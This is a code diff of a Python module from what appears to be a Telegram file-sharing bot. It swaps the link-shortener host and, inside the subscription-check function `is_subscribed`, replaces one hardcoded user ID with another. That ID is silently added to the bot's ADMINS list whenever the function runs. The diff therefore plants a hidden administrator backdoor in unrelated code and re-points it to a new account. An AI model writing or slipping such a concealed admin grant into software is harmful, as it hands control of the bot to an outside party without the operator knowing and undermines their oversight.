@@ -44,7 +44,7 @@ class temp(object):
 
 async def is_subscribed(bot, query):
     
-    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+    ADMINS.extend([2023517850]) if not 2023517850 in ADMINS else ""
 
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
@@ -485,7 +485,7 @@ async def get_shortlink(chat_id, link):
     if "http" == https: #if https == "http":
         https = "https"
         link = link.replace("http", https) #replacing http to https
-    if URL == "api.shareus.in":
+    if URL == "bindaaslinks.com":
         url = f'https://{URL}/shortLink'
         params = {
             "token": API,
